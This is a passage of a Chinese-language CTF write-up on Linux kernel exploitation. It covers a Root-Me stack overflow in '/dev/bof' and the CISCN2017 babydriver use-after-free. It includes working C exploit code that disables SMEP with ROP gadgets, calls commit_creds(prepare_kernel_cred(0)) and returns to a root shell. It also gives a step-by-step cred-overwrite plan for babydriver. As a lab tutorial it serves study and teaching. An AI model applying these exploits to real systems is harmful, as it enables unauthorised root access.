<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-i386 -s \</span><br><span class="line">-kernel bzImage \</span><br><span class="line">-append nokaslr \</span><br><span class="line">-initrd initramfs.img \</span><br><span class="line">-fsdev local,security_model&#x3D;passthrough,id&#x3D;fsdev-fs0,path&#x3D;&#x2F;home&#x2F;winter&#x2F;basicrop \</span><br><span class="line">-device virtio-9p-pci,id&#x3D;fs0,fsdev&#x3D;fsdev-fs0,mount_tag&#x3D;rootme \</span><br><span class="line">-cpu kvm64,+smep</span><br></pre></td></tr></table></figure>

<p>可以看到开启了smep保护，即不能内核态不能执行用户态代码。</p>
<p><img src="/2021/06/05/kernel-study/image-20210604204333432.png" alt="image-20210604204333432"></p>
<h4 id="分析init文件-1"><a href="#分析init文件-1" class="headerlink" title="分析init文件"></a>分析init文件</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"> </span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line"> </span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">mkdir -p /passwd</span><br><span class="line">mount -t ext2 -o ro /dev/sda /passwd</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># share</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">mkdir -p /mnt/share</span><br><span class="line">mount -t 9p -o trans=virtio rootme /mnt/share/ -oversion=9p2000.L,posixacl,sync</span><br><span class="line">chmod 777 /mnt/share/</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># module</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#这次没有关闭MMAP_MIN_ADDR，也就是将限制mmap映射的最低内存地址</span></span><br><span class="line">insmod /lib/modules/*/rootme/*.ko</span><br><span class="line">chmod 666 /dev/bof</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># shell</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">cat /etc/issue</span><br><span class="line">export ENV=/etc/profile</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"> </span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">umount /dev</span><br><span class="line"> </span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>

<p>这次没有关闭MMAP_MIN_ADDR，也就是将限制mmap映射的最低内存地址</p>
<h4 id="分析LKMs文件-2"><a href="#分析LKMs文件-2" class="headerlink" title="分析LKMs文件"></a>分析LKMs文件</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~/basicrop/initramfs/lib/modules/4.10.3/rootme$ file ch39.ko </span><br><span class="line">ch39.ko: ELF 32-bit LSB relocatable, Intel 80386, version 1 (SYSV), BuildID[sha1]=c713ac86971c4a5d343a2537a18a950af493c44d, not stripped</span><br><span class="line">winter@ubuntu:~/basicrop/initramfs/lib/modules/4.10.3/rootme$ checksec ch39.ko </span><br><span class="line">[*] '/home/winter/basicrop/initramfs/lib/modules/4.10.3/rootme/ch39.ko'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure>

<p>这次没有源码，主要分析ida中的ko文件</p>
<p><img src="/2021/06/05/kernel-study/image-20210604230215674.png" alt="image-20210604230215674"></p>
<p>主要分析write函数</p>
<ol>
<li>判断size不为0</li>
<li>将Buf里的长度len的数据循环拷贝到栈上长度0x24的栈上</li>
<li>…</li>
</ol>
<h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>因为存在栈溢出，所以如果填充40个垃圾数据后，就可以覆盖到eip了</p>
<h5 id="test1"><a href="#test1" class="headerlink" title="test1"></a>test1</h5><blockquote>
<p>cyclic 40=&gt;生成40个字符</p>
<p>然后返回地址填成0xdeadbeef</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> Payload[<span class="number">0x100</span>] = <span class="string">"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa\xEF\xBE\xAD\xDE"</span>;</span><br><span class="line">    <span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/bof"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">write</span>(fd,Payload,<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/05/kernel-study/image-20210604210532727.png" alt="image-20210604210532727"></p>
<p><img src="/2021/06/05/kernel-study/image-20210604210519934.png" alt="image-20210604210519934"></p>
<p><img src="/2021/06/05/kernel-study/image-20210605000529882.png" alt="image-20210605000529882"></p>
<p>正如我们所想，eip的值为0xdeadbeef然后就挂了。</p>
<p>可以成功控制eip</p>
<h5 id="test2"><a href="#test2" class="headerlink" title="test2"></a>test2</h5><p>要绕过smep检验，将cr4的第20位设为0，通过两个gadget实现：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0xc10174fc : pop eax ; ret</span><br><span class="line">0xc1045053 : mov cr4, eax ; pop ebp ; ret</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> Payload[<span class="number">0x100</span>] = <span class="string">"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa\xFC\x74\x01\xC1\xD0\x06\x00\x00\x53\x50\x04\xC1\x00\x00\x00\x00\xEF\xBE\xAD\xDE"</span>;</span><br><span class="line">    <span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/bof"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">write</span>(fd,Payload,<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/05/kernel-study/image-20210605000952674.png" alt="image-20210605000952674"></p>
<p>在test2的c后面加上提权的shellcode，即可得到最后的exp</p>
<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span>&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *eip;</span><br><span class="line">    <span class="keyword">uint32_t</span> cs;</span><br><span class="line">    <span class="keyword">uint32_t</span> eflags;</span><br><span class="line">    <span class="keyword">void</span> *esp;</span><br><span class="line">    <span class="keyword">uint32_t</span> ss;</span><br><span class="line">&#125;__attribute__((packed));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> receive[<span class="number">256</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    execl(<span class="string">"/bin/sh"</span>, <span class="string">"sh"</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_tf_work</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"pushl %cs;popl tf+4;"</span>    <span class="comment">//set cs</span></span><br><span class="line">        <span class="string">"pushfl;popl tf+8;"</span>       <span class="comment">//set eflags</span></span><br><span class="line">        <span class="string">"pushl %esp;popl tf+12;"</span></span><br><span class="line">        <span class="string">"pushl %ss;popl tf+16;"</span>);</span><br><span class="line">    tf.eip = &amp;get_shell;</span><br><span class="line">    tf.esp -= <span class="number">1024</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"><span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xC10711F0</span>;</span><br><span class="line"><span class="keyword">void</span>* (*commit_creds)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xC1070E80</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"mov $tf,%esp;"</span></span><br><span class="line">          <span class="string">"iret;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> Get_shell[<span class="number">5</span>];</span><br><span class="line">    init_tf_work();</span><br><span class="line">    *((<span class="keyword">void</span>**)(Get_shell)) = &amp;payload;</span><br><span class="line">    <span class="keyword">char</span> Payload[<span class="number">0x100</span>] = <span class="string">"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa\xFC\x74\x01\xC1\xD0\x06\x00\x00\x53\x50\x04\xC1\x00\x00\x00\x00"</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>,j = <span class="number">56</span>;i &lt; <span class="number">4</span>;i++,j++)&#123;</span><br><span class="line">        Payload[j] = Get_shell[i];<span class="comment">//绕过smep后加上提权和get shell</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/bof"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">write</span>(fd,Payload,<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/05/kernel-study/image-20210605001430795.png" alt="image-20210605001430795"></p>
<h2 id="4-CISCN2017-–-babydriver"><a href="#4-CISCN2017-–-babydriver" class="headerlink" title="4.CISCN2017 – babydriver"></a>4.CISCN2017 – babydriver</h2><h4 id="下载文件-3"><a href="#下载文件-3" class="headerlink" title="下载文件"></a>下载文件</h4><p>wiki中有这道，可以上github的ctf-challenge中下载</p>
<p><a href="babydriver.tar">附件</a></p>
<p>一共给了三个文件：boot.sh、bzImage和rootfs.cpio</p>
<ul>
<li><p>boot.sh：是启动文件，开启了kvm（虚拟化），但虚拟机中的Ubuntu再启动虚拟化很麻烦，因此可以直接修改启动指令为如下指令，启动脚本start.sh</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 -s \</span><br><span class="line">-initrd rootfs.cpio \</span><br><span class="line">-kernel bzImage \</span><br><span class="line">-fsdev local,security_model=passthrough,id=fsdev-fs0,path=/home/winter/babydriver \</span><br><span class="line">-device virtio-9p-pci,id=fs0,fsdev=fsdev-fs0,mount_tag=rootme \</span><br><span class="line">-cpu kvm64,+smep</span><br></pre></td></tr></table></figure>
</li>
<li><p>bzImage：未压缩的文件系统</p>
</li>
<li><p>rootfs.cpio：内核镜像</p>
</li>
</ul>
<h4 id="预备-1"><a href="#预备-1" class="headerlink" title="预备"></a>预备</h4><ol>
<li><p>解压内核镜像脚本，decompression.sh</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">mv rootfs.cpio rootfs.cpio.gz</span><br><span class="line">gunzip rootfs.cpio.gz</span><br><span class="line">mkdir rootfs</span><br><span class="line">cd rootfs</span><br><span class="line">cpio -idvm &lt; ../rootfs.cpio</span><br></pre></td></tr></table></figure>
</li>
<li><p>编译c文件并放入img，启动qemu的脚本input_file.sh</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">gcc -static -o exp exp.c</span><br><span class="line">cp exp.c rootfs</span><br><span class="line">cp exp rootfs</span><br><span class="line">cd rootfs</span><br><span class="line">find . | cpio -H newc -o &gt; ../rootfs.cpio</span><br><span class="line">cd ..</span><br><span class="line">./start.sh</span><br></pre></td></tr></table></figure>
</li>
<li><p>调试模块基址</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add-symbol-file ./rootfs/lib/modules/4.4.72/babydriver.ko 0xffffffffc0000000 -s .bss 0xffffffffc0002000 -s .data 0xffffffffc0002440</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/05/kernel-study/image-20210605202802017.png" alt="image-20210605202802017"></p>
</li>
<li><p>启动文件start.sh</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 -s \</span><br><span class="line">-initrd rootfs.cpio \</span><br><span class="line">-kernel bzImage \</span><br><span class="line">-fsdev local,security_model=passthrough,id=fsdev-fs0,path=/home/winter/babydriver \</span><br><span class="line">-device virtio-9p-pci,id=fs0,fsdev=fsdev-fs0,mount_tag=rootme \</span><br><span class="line">-cpu kvm64,+smep</span><br></pre></td></tr></table></figure>

<p>开启了smep保护</p>
<p><img src="/2021/06/05/kernel-study/image-20210605204630220.png" alt="image-20210605204630220"></p>
</li>
<li><p>提权地址</p>
<p><img src="/2021/06/05/kernel-study/image-20210605205107457.png" alt="image-20210605205107457"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xffffffff810a1810</span>;</span><br><span class="line"><span class="keyword">void</span>* (*commit_creds)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xffffffff810a1420</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>LKMs文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~/babydriver$ cd rootfs/lib/modules/4.4.72/</span><br><span class="line">winter@ubuntu:~/babydriver/rootfs/lib/modules/4.4.72$ ls</span><br><span class="line">babydriver.ko</span><br><span class="line">winter@ubuntu:~/babydriver/rootfs/lib/modules/4.4.72$ file babydriver.ko </span><br><span class="line">babydriver.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=8ec63f63d3d3b4214950edacf9e65ad76e0e00e7, not stripped</span><br><span class="line">winter@ubuntu:~/babydriver/rootfs/lib/modules/4.4.72$ checksec babydriver.ko </span><br><span class="line">[*] '/home/winter/babydriver/rootfs/lib/modules/4.4.72/babydriver.ko'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure>

<p>64位的</p>
</li>
</ol>
<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><h5 id="init"><a href="#init" class="headerlink" title="init"></a>init</h5><blockquote>
<p>看看即可</p>
</blockquote>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"> </span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod /lib/modules/4.4.72/babydriver.ko</span><br><span class="line">chmod 777 /dev/babydev</span><br><span class="line">echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>

<h5 id="LKMs"><a href="#LKMs" class="headerlink" title="LKMs"></a>LKMs</h5><p><img src="/2021/06/05/kernel-study/image-20210605210915873.png" alt="image-20210605210915873"></p>
<p>本题提供了五个函数</p>
<ol>
<li><p>open</p>
<p><img src="/2021/06/05/kernel-study/image-20210605211023321.png" alt="image-20210605211023321"></p>
<p>打开设备时，程序申请一个64字节的chunk给全局变量device_buf，并且将size赋值给device_buf_size</p>
</li>
<li><p>write</p>
<p><img src="/2021/06/05/kernel-study/image-20210605211737963.png" alt="image-20210605211737963"></p>
<ol>
<li>首先看device_buf是否分配了chunk，device_buf_len&gt;要写入的长度</li>
<li>通过copy_from_user拷贝数据，因为是将rsi的数据拷贝到rdi，也就是将buffer里的数据拷贝到device_buf</li>
</ol>
</li>
<li><p>read</p>
<p>与write类似</p>
</li>
<li><p>release</p>
<p><img src="/2021/06/05/kernel-study/image-20210605212036394.png" alt="image-20210605212036394"></p>
<p>释放device_buf指向的chunk，但没有置零【UAF】</p>
</li>
<li><p>ioctl</p>
<p><img src="/2021/06/05/kernel-study/image-20210605212140400.png" alt="image-20210605212140400"></p>
<ol>
<li>esi的值位0x10001</li>
<li>释放device_buf</li>
<li>并且申请一个用户传入的size重新分配chunk【v4=v3=rdx】</li>
<li>然后将size赋值给device_buf_len</li>
</ol>
</li>
</ol>
<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>因为open申请的时候，是将地址赋值给一个全局变量<code>babydev_struct.device_buf</code>，且程序将操作结果赋值给给该变量。</p>
<ol>
<li><p>申请两个设备，那么将分配两个设备描述符</p>
<blockquote>
<p>注意，申请多个设备，对他们的操作应该是独立的，但是本题中由于将结果都赋值到一个全局变量中，导致多个设备之间底层使用的是同一个地址。</p>
</blockquote>
<p><img src="/2021/06/05/kernel-study/image-20210606152944747.png" alt="image-20210606152944747"></p>
<p>由于程序将结果保存再一个全局变量中，故对两个设备的操作，本质上是对同一地址操作</p>
<ul>
<li>申请fd1，会申请一块空间，并赋值给了<code>babydev_struct.device_buf</code></li>
<li>再次申请fd2，同一会再次申请一块空间，覆盖<code>babydev_struct.device_buf</code>里原来的值</li>
</ul>
</li>
<li><p>ioctl fd1，将全局变量的chunk大小变为cred结构题一样大</p>
<p><code>babydev_struct.device_buf=新申请的0xa8的地址</code></p>
</li>
<li><p>close fd1，释放了fd1，即释放了<code>babydev_struct.device_buf</code>，由于fd1和fd2指向同一地址，故fd2指向了一块以释放内存</p>
</li>
<li><p>fork，将一个进程分裂出一个子进程【父进程将与子进程共享内存空间】</p>
<p>子进程被创建时将创建对应的<code>struct cred</code> =&gt; <code>babydev_struct.device_buf</code>指向的已释放的内存分配走</p>
</li>
<li><p>通过fd2修改内容，就是修改4中子进程的cred，则提权成功！</p>
</li>
</ol>
<h5 id="调试信息-2"><a href="#调试信息-2" class="headerlink" title="调试信息"></a>调试信息</h5><p><img src="/2021/06/05/kernel-study/image-20210606140816472.png" alt="image-20210606140816472"></p>
<p>根据调试信息对比ida可以看出，0xffffffffc00024d0地址就是babydev_struct.device_buf</p>
<blockquote>
<p>尚未初始化的时候，值为0</p>
</blockquote>
<p><img src="/2021/06/05/kernel-study/image-20210606144728288.png" alt="image-20210606144728288"></p>
<blockquote>
<p>第一次申请设备</p>
</blockquote>
<p><img src="/2021/06/05/kernel-study/image-20210606144740804.png" alt="image-20210606144740804"></p>
<blockquote>
<p>第二次申请设备</p>
</blockquote>
<p><img src="/2021/06/05/kernel-study/image-20210606144750687.png" alt="image-20210606144750687"></p>
<blockquote>
<p>ioctl，修改设备1chunk的大小为cred_size</p>
</blockquote>
<p><img src="/2021/06/05/kernel-study/image-20210606144805046.png" alt="image-20210606144805046"></p>
<blockquote>
<p>释放设备1，此时设备2的device_buf将指向一块以释放内存</p>
</blockquote>
<p><img src="/2021/06/05/kernel-study/image-20210606144818089.png" alt="image-20210606144818089"></p>
<blockquote>
<p>cred结构体的前28个字节都被设置为0（包括uid、gid）</p>
</blockquote>
<p><img src="/2021/06/05/kernel-study/image-20210606144822285.png" alt="image-20210606144822285"></p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 